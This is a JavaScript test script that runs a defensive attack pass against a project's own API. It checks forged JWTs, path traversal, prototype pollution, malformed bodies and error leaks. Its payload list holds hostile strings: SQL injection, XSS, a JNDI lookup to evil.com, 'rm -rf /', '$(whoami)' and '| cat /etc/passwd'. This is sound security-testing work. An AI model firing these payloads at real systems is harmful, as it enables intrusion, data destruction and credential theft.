/**
 * Hostile input — a deliberate attack pass on the running API.
 *
 * Everything else in this folder asks "who is allowed to do what?". This asks
 * a blunter question: what happens when the input is garbage, forged,
 * malformed, the wrong type, or aimed at a URL that shouldn't answer at all.
 *
 * Two rules for reading the results:
 *   - A 4xx is a PASS. It means the server understood the request and refused.
 *   - A 500, a hang, or a crash is a FAIL, even on absurd input — an
 *     unhandled exception is where real vulnerabilities start.
 *
 * The server's health is re-checked after every section, because the failure
 * that matters most is the one that takes the process down.
 */
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath, pathToFileURL } from "node:url";

const BACKEND_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
process.chdir(BACKEND_ROOT);
const src = (f) => pathToFileURL(path.join(BACKEND_ROOT, "src", f)).href;

const { createUser, setEmailVerified, getActor } = await import(src("db.js"));
const { signToken } = await import(src("auth.js"));
const { generateWallet } = await import(src("wallets.js"));
const { fundWallet } = await import(src("treasury.js"));

const BASE = process.env.API_URL || "http://127.0.0.1:4000";
const TS = Date.now();
let failures = 0;
let checks = 0;

function check(label, cond, detail = "") {
  checks++;
  if (!cond) failures++;
  console.log(`  [${cond ? "PASS" : "FAIL"}] ${label}${detail ? "  -- " + detail : ""}`);
}

/** Reports a no-answer result explicitly rather than as a bare "status 0". */
function describe(res) {
  return res.status === 0 ? `NO ANSWER (${res.error})` : `status ${res.status}`;
}

/**
 * Raw request — deliberately allows malformed bodies and odd headers.
 *
 * A body is never attached to GET/HEAD: fetch refuses that outright, which
 * would fail in the client and be indistinguishable here from the server
 * having dropped the connection. A `status: 0` must only ever mean "the
 * server did not answer", or this whole suite reports noise as findings.
 */
async function raw(method, urlPath, { token, body, headers = {}, rawBody } = {}) {
  const bodyless = method === "GET" || method === "HEAD";
  const payload = bodyless ? undefined : rawBody !== undefined ? rawBody : body ? JSON.stringify(body) : undefined;
  try {
    const res = await fetch(BASE + urlPath, {
      method,
      headers: {
        ...(rawBody === undefined ? { "Content-Type": "application/json" } : {}),
        ...(token ? { Authorization: `Bearer ${token}` } : {}),
        ...headers,
      },
      body: payload,
      signal: AbortSignal.timeout(20000),
    });
    let data = null;
    try { data = await res.json(); } catch { /* non-JSON reply */ }
    return { status: res.status, data };
  } catch (err) {
    return { status: 0, error: (err.cause && err.cause.code) || err.message };
  }
}

/** A 4xx is a refusal (good). 0 = no reply, 5xx = server fault (bad). */
function refused(res) {
  return res.status >= 400 && res.status < 500;
}

async function serverAlive() {
  const res = await raw("GET", "/admin/health");
  return res.status === 200;
}

async function sectionEnd(name) {
  const alive = await serverAlive();
  check(`${name}: the server is still up afterwards`, alive);
}

let seq = 0;
async function account() {
  const { address, encryptedPrivateKey } = generateWallet();
  await fundWallet(address);
  const user = createUser({
    email: `hostile-${TS}-${seq++}@test.com`,
    passwordHash: "not-used",
    walletAddress: address,
    encryptedPrivateKey,
  });
  setEmailVerified(user.id);
  return { id: user.id, address, token: signToken({ userId: user.id, address, tokenVersion: user.token_version }) };
}

const victim = await account();

/**
 * A fresh account per hostile payload.
 *
 * /me/register is rate-limited per authenticated user (10/hour). Reusing one
 * account meant the limiter answered with a 429 long before the validation
 * being tested ever ran — the checks "passed" without exercising anything.
 * A 429 is a refusal, but it is not evidence about type handling.
 */
async function freshVictim() {
  return account();
}

// =============================================================================
console.log("\n=== A. Forged and tampered session tokens ===");
// =============================================================================
{
  const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");

  // The classic: claim the token needs no signature.
  const algNone = `${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: victim.id, address: victim.address, tokenVersion: 0 })}.`;
  check("alg=none token is refused", refused(await raw("GET", "/me", { token: algNone })),
    `status ${(await raw("GET", "/me", { token: algNone })).status}`);

  // Correctly shaped, signed with a secret we invented.
  const wrongSecret = (() => {
    const header = b64({ alg: "HS256", typ: "JWT" });
    const payload = b64({ sub: victim.id, address: victim.address, tokenVersion: 0, exp: Math.floor(Date.now() / 1000) + 3600 });
    const sig = crypto.createHmac("sha256", "not-the-real-secret").update(`${header}.${payload}`).digest("base64url");
    return `${header}.${payload}.${sig}`;
  })();
  check("token signed with the wrong secret is refused", refused(await raw("GET", "/me", { token: wrongSecret })));

  // A real token with one character of the signature changed.
  const real = victim.token;
  const flipped = real.slice(0, -1) + (real.at(-1) === "A" ? "B" : "A");
  check("token with a tampered signature is refused", refused(await raw("GET", "/me", { token: flipped })));

  // A real token whose payload has been edited to point at someone else.
  const [h, , s] = real.split(".");
  const swapped = `${h}.${b64({ sub: 1, address: victim.address, tokenVersion: 0 })}.${s}`;
  check("token with an edited payload is refused", refused(await raw("GET", "/me", { token: swapped })));

  const expired = (() => {
    const header = b64({ alg: "HS256", typ: "JWT" });
    const payload = b64({ sub: victim.id, address: victim.address, tokenVersion: 0, exp: Math.floor(Date.now() / 1000) - 60 });
    return `${header}.${payload}.${crypto.randomBytes(32).toString("base64url")}`;
  })();
  check("expired token is refused", refused(await raw("GET", "/me", { token: expired })));

  for (const junk of ["", "Bearer", "....", "null", "undefined", "a.b.c", "%00", "../../etc/passwd"]) {
    check(`junk token ${JSON.stringify(junk)} is refused`, refused(await raw("GET", "/me", { token: junk })));
  }

  // Odd Authorization header shapes.
  for (const header of ["Basic abc123", "bearer", "Bearer  ", "Bearer a b c", "NotAScheme xyz"]) {
    const res = await raw("GET", "/me", { headers: { Authorization: header } });
    check(`Authorization: ${JSON.stringify(header)} is refused`, refused(res), `status ${res.status}`);
  }
}
await sectionEnd("A");

// =============================================================================
console.log("\n=== B. URLs that should not answer ===");
// =============================================================================
{
  // Every write route, unauthenticated.
  const guarded = [
    ["GET", "/me"],
    ["POST", "/me/register"],
    ["GET", "/me/join-code"],
    ["POST", "/me/join-code/regenerate"],
    ["POST", "/credentials/issue"],
    ["POST", "/credentials/0/correct"],
    ["POST", "/visits/announce"],
    ["GET", "/students"],
    ["GET", `/students/${victim.address}/credentials`],
    ["GET", "/admin/actors"],
    ["GET", "/admin/actions"],
    ["POST", `/admin/actors/${victim.address}/approve`],
    ["POST", `/admin/actors/${victim.address}/reject`],
    ["POST", "/admin/admins"],
    ["GET", "/admin/admins"],
  ];
  for (const [method, urlPath] of guarded) {
    const res = await raw(method, urlPath, { body: {} });
    check(`${method} ${urlPath} without a token`, res.status === 401 || res.status === 403, describe(res));
  }

  // Path traversal and encoding tricks aimed at the admin routes.
  const traversals = [
    "/public/../admin/actors",
    "/public/..%2fadmin%2factors",
    "/public/%2e%2e/admin/actors",
    "/students/..%2f..%2fadmin%2factors",
    "/admin/../admin/actors",
    "/ADMIN/actors",
    "/admin//actors",
    "/admin/actors%00",
    "/admin/actors/../../actors",
  ];
  for (const urlPath of traversals) {
    const res = await raw("GET", urlPath);
    check(`traversal ${urlPath} does not reach the queue`,
      res.status !== 200 || !Array.isArray(res.data?.actors),
      `status ${res.status}`);
  }

  // Files and paths that shouldn't be served at all.
  for (const urlPath of ["/.env", "/package.json", "/src/config.js", "/data/chainproof.sqlite", "/../backend/.env", "/node_modules/express/package.json"]) {
    const res = await raw("GET", urlPath);
    check(`${urlPath} is not served`, res.status === 404 || res.status === 400, `status ${res.status}`);
  }

  // Wrong methods on real routes.
  for (const method of ["DELETE", "PUT", "PATCH"]) {
    const res = await raw(method, "/admin/actors", { body: {} });
    check(`${method} /admin/actors is not accepted`, res.status !== 200, `status ${res.status}`);
  }
}
await sectionEnd("B");

// =============================================================================
console.log("\n=== C. Injection payloads in real fields ===");
// =============================================================================
{
  const payloads = [
    "'; DROP TABLE users;--",
    "' OR '1'='1",
    "1' UNION SELECT password_hash FROM users--",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
    "../../../../etc/passwd",
    "\u0000nullbyte",
    "%00",
    "`rm -rf /`",
    "$(whoami)",
    "| cat /etc/passwd",
  ];

  for (const payload of payloads) {
    const who = await freshVictim();
    const res = await raw("POST", "/me/register", {
      token: who.token,
      body: { role: "Company", name: payload, registrationNumber: payload },
    });
    // 400 specifically: a 429 would mean the limiter answered, not validation.
    check(`register name/CIN ${JSON.stringify(payload.slice(0, 24))} rejected by validation`,
      res.status === 400, describe(res));
  }

  // Injection through the login form.
  for (const payload of payloads.slice(0, 4)) {
    const res = await raw("POST", "/auth/login", { body: { email: payload, password: payload } });
    check(`login with ${JSON.stringify(payload.slice(0, 20))} refused cleanly`, refused(res), `status ${res.status}`);
  }

  // Injection through a URL parameter that reaches a query.
  for (const payload of ["' OR 1=1--", "%27%20OR%201%3D1--", "0x0'--"]) {
    const res = await raw("GET", `/public/colleges/${encodeURIComponent(payload)}/records`);
    check(`college address ${JSON.stringify(payload)} refused`, refused(res), `status ${res.status}`);
  }

  // The users table must still be there.
  const stillAlive = await raw("POST", "/auth/login", { body: { email: "nobody@example.com", password: "whatever1" } });
  check("the users table survived the SQL payloads", stillAlive.status === 401 || stillAlive.status === 403,
    `status ${stillAlive.status}`);
}
await sectionEnd("C");

// =============================================================================
console.log("\n=== D. Wrong types where a string is expected ===");
// =============================================================================
{
  const wrongTypes = [
    ["a number", 12345],
    ["null", null],
    ["a boolean", true],
    ["an array", ["a", "b"]],
    ["an object", { evil: true }],
    ["a nested array", [["deep"]]],
    ["an empty object", {}],
  ];

  for (const [label, value] of wrongTypes) {
    const who = await freshVictim();
    const res = await raw("POST", "/me/register", {
      token: who.token,
      body: { role: value, name: value, registrationNumber: value, website: value },
    });
    check(`register with ${label} in every field`, res.status === 400, describe(res));
  }

  // Signup's own type handling is deliberately NOT tested here. It is limited
  // per IP, so these requests would burn the shared budget that the full
  // journey suite needs, and would answer 429 before validation ran — costing
  // a real test elsewhere to prove nothing here. Covered instead in
  // test/auth-flow.test.js, where nothing is in the way.

  for (const [label, value] of wrongTypes) {
    const res = await raw("POST", "/credentials/issue", {
      token: victim.token,
      body: { studentAddress: value, credType: value, ipfsHash: value },
    });
    check(`issue with ${label}`, res.status === 400, describe(res));
  }

  // Numeric extremes where a timestamp is expected.
  for (const value of [-1, 0, NaN, Infinity, -Infinity, 1e308, Number.MAX_SAFE_INTEGER + 1, "1e999", 1.5]) {
    const res = await raw("POST", "/visits/announce", {
      token: victim.token,
      body: { companyName: "Edge Co", visitDate: value, ipfsHash: "QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG" },
    });
    check(`visitDate ${String(value)} refused`, refused(res), `status ${res.status}`);
  }
}
await sectionEnd("D");

// =============================================================================
console.log("\n=== E. Prototype pollution ===");
// =============================================================================
{
  const before = {}.polluted;
  const pollutions = [
    { __proto__: { polluted: "yes" } },
    { constructor: { prototype: { polluted: "yes" } } },
    { name: "X", "__proto__.polluted": "yes" },
    { role: "Company", name: { __proto__: { polluted: "yes" } } },
  ];
  for (const body of pollutions) {
    await raw("POST", "/me/register", { token: victim.token, body });
    await raw("POST", "/auth/signup", { token: victim.token, body });
  }
  check("Object.prototype was not polluted", {}.polluted === before && {}.polluted === undefined,
    String({}.polluted));

  // The raw-string form, which bypasses JSON.stringify's own handling.
  await raw("POST", "/me/register", {
    token: victim.token,
    rawBody: '{"__proto__":{"polluted":"yes"},"role":"Company","name":"X"}',
    headers: { "Content-Type": "application/json" },
  });
  check("still not polluted after a raw __proto__ body", {}.polluted === undefined, String({}.polluted));
}
await sectionEnd("E");

// =============================================================================
console.log("\n=== F. Malformed bodies and protocol abuse ===");
// =============================================================================
{
  const malformed = [
    ["truncated JSON", '{"role":"Company"'],
    ["not JSON at all", "this is not json"],
    ["empty body", ""],
    ["just a quote", '"'],
    ["array at the top level", "[1,2,3]"],
    ["a bare number", "42"],
    ["null literal", "null"],
    ["NaN literal", "{\"visitDate\": NaN}"],
    ["duplicate keys", '{"name":"a","name":"b"}'],
  ];
  for (const [label, rawBody] of malformed) {
    const res = await raw("POST", "/me/register", {
      token: victim.token,
      rawBody,
      headers: { "Content-Type": "application/json" },
    });
    // A 500 here would mean the server treats the client's bad JSON as its own
    // fault — wrong status class, and a stack trace in the log for every one.
    check(`${label} answered as a client error`, res.status >= 400 && res.status < 500, describe(res));
  }

  // Deeply nested JSON — a classic parser exhaustion attempt.
  const deep = "[".repeat(5000) + "]".repeat(5000);
  const deepRes = await raw("POST", "/me/register", { token: victim.token, rawBody: deep, headers: { "Content-Type": "application/json" } });
  check("deeply nested JSON handled without a 500", deepRes.status !== 0 && deepRes.status < 500, `status ${deepRes.status}`);

  // Oversized body.
  const huge = JSON.stringify({ role: "Company", name: "A".repeat(2 * 1024 * 1024) });
  const hugeRes = await raw("POST", "/me/register", { token: victim.token, rawBody: huge, headers: { "Content-Type": "application/json" } });
  check("2MB body is rejected with 413", hugeRes.status === 413, describe(hugeRes));

  // Wrong or missing content types.
  for (const ct of ["text/plain", "application/xml", "multipart/form-data", ""]) {
    const res = await raw("POST", "/me/register", {
      token: victim.token,
      rawBody: '{"role":"Company","name":"X"}',
      headers: ct ? { "Content-Type": ct } : {},
    });
    check(`Content-Type ${JSON.stringify(ct)} handled without a 500`, res.status < 500, `status ${res.status}`);
  }

  // Header injection attempts.
  const headerRes = await raw("GET", "/public/overview", {
    headers: { "X-Forwarded-For": "127.0.0.1, evil", "X-Original-URL": "/admin/actors" },
  });
  check("X-Original-URL does not reroute to admin", headerRes.status === 200 && !headerRes.data?.actors);
}
await sectionEnd("F");

// =============================================================================
console.log("\n=== G. Unicode, control characters and length ===");
// =============================================================================
{
  const nasty = [
    ["null byte", "Acme\u0000Corp"],
    ["newline injection", "Acme\nrole: admin"],
    ["carriage return", "Acme\r\nSet-Cookie: a=b"],
    ["right-to-left override", "Acme\u202Ekrow"],
    ["zero-width joiners", "A\u200Bc\u200Bm\u200Be"],
    ["emoji", "🏢🏢🏢"],
    ["combining characters", "A" + "\u0301".repeat(200)],
    ["Devanagari over the byte limit", "अ".repeat(40)],
  ];
  for (const [label, name] of nasty) {
    const who = await freshVictim();
    const res = await raw("POST", "/me/register", {
      token: who.token,
      body: { role: "Company", name, registrationNumber: "L12345MH2020PLC123456" },
    });
    check(`name with ${label} handled without a 500`, res.status < 500 && res.status !== 429, describe(res));
  }

  // Very long query strings and paths.
  const longQuery = await raw("GET", "/public/visits?limit=" + "9".repeat(5000));
  check("absurd ?limit handled", longQuery.status < 500, `status ${longQuery.status}`);

  const longPath = await raw("GET", "/public/colleges/" + "a".repeat(10000) + "/records");
  check("10k-character path handled", longPath.status < 500 && longPath.status !== 0, `status ${longPath.status}`);

  // Parameter pollution.
  const polluted = await raw("GET", "/public/visits?limit=5&limit=999999");
  check("duplicated query parameter handled", polluted.status < 500, `status ${polluted.status}`);
}
await sectionEnd("G");

// =============================================================================
console.log("\n=== H. Does any of it leak internals? ===");
// =============================================================================
{
  const probes = [
    ["GET", "/public/colleges/%00/records"],
    ["GET", "/students/notanaddress/credentials"],
    ["POST", "/credentials/notanumber/correct"],
    ["POST", "/admin/actors/xyz/approve"],
  ];
  for (const [method, urlPath] of probes) {
    const res = await raw(method, urlPath, { token: victim.token, body: {} });
    const blob = JSON.stringify(res.data || "");
    const leaks = /at \/|\.js:\d+|node_modules|SQLITE_|better-sqlite3|D:\\\\|\/home\/|stack/i.test(blob);
    check(`${method} ${urlPath} reveals no stack trace or internal path`, !leaks,
      leaks ? blob.slice(0, 120) : `status ${res.status}`);
  }

  // An error response must never echo a secret.
  const res = await raw("POST", "/auth/login", { body: { email: "x@y.com", password: "wrong" } });
  const blob = JSON.stringify(res.data || "");
  check("login failure leaks no hash or secret", !/\$2[aby]\$|password_hash|jwtSecret/i.test(blob), blob.slice(0, 80));
}
await sectionEnd("H");

console.log(`\n${"=".repeat(70)}`);
console.log(`${checks} checks — ${failures === 0 ? "ALL PASSED" : failures + " FAILED"}`);
console.log(`${"=".repeat(70)}\n`);
process.exit(failures === 0 ? 0 : 1);
